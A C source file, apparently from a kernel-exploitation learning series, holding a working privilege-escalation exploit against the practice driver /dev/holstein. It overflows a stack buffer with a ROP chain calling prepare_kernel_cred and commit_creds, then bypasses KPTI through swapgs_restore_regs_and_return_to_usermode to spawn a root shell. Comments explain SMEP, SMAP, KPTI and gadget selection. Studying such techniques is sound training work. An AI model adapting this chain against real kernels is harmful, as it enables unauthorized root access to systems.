/**
 * kpti:
 *   - SMEP is enabled
 *   - SMAP is enabled
 *   - KPTI is enabled
 *   - KASLR is disabled
 * We cannot run code that resides in user space
 * 
 * If KPTI is enabled, problems will arise when finally returning to user space
 * after the privilege escalation.
 * 
 * Since KPTI is a page table switch, the user kernel space can be switched by
 * manipulating the CR3 register. On Linux, ORing CR3 with 0x1000 (that is,
 * changing the PDBR) switches from kernel space to user space. This operation is
 * defined in `swapgs_restore_regs_and_return_to_usermode` [1], [2]
 *
 * Like in krop.c, SMAP has no affect since the ROP chain is executed from
 * kernel stack.
 * 
 * [1] https://github.com/torvalds/linux/blob/v6.4/arch/x86/entry/entry_64.S#L625
 * [2] https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#tweaking-the-rop-chain
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;

/*
 * Note: these gadgets are expressed in Intel syntax
 *
 * Example:
 * #define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
 * 
 *             0xffffffff8160c96b      4889c7         mov rdi, rax
 *             0xffffffff8160c96e      f348a5         rep movsq qword [rdi], qword [rsi]
 *             0xffffffff8160c971      c3             ret
 * 
 * The goal of this gadget is moving `rax` int `rdi` but there are no gadgets
 * that do directly:
 *
 * [cpey@nuc 04.krop]$ ropr vmlinux --noisy --nosys --nojop -R "mov rdi, rax; ret;"
 *  ==> Found 0 gadgets in 1.486 seconds
 * 
 *  rep movsq [rdi], [rsi]
 *  ----------------------
 * `rep` repeats the following string operation `ecx` times. `movsq` copies data from
 * `rsi` to `rdi` and increments or decrements the pointers based on the setting
 * of the direction flag. As such, repeating it will move a range of memory to
 * somewhere else. 
 * 
 * The rop chain is not interested on any of this, that is why this gadget is
 * preceded with a gadget that sets `rcx` to 0, so no move operation happens.
 *
 */

#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds        0xffffffff8106e390
// 22 is the offset of the first mov instruction, after all pops
// See swapgs_restore_regs_and_return_to_usermode.md
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81800e10 + 22
#define rop_pop_rdi               0xffffffff8127bbdc
#define rop_pop_rcx               0xffffffff8132cdd3
#define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
#define rop_swapgs                0xffffffff8160bf7e
#define rop_iretq                 0xffffffff810202af

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) fatal("open(\"/dev/holstein\")");

  char buf[0x500];
  memset(buf, 'A', 0x408);
  unsigned long *chain = (unsigned long*)&buf[0x408];
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = swapgs_restore_regs_and_return_to_usermode; // it calls iretq
  *chain++ = 0; // dummy rax
  *chain++ = 0; // dummy rdi
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
  write(fd, buf, (void*)chain - (void*)buf);

  close(fd);
  return 0;
}
